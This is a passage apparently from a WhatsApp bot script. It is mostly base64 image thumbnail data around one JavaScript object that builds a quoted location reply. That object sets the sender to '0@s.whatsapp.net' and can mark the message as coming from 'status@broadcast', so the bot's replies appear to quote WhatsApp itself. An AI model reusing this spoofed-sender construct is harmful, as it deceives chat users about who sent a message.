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"}}}
// REPLY WITH LOCATION
const floc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `Hello ${pushname}`, jpegThumbnail: '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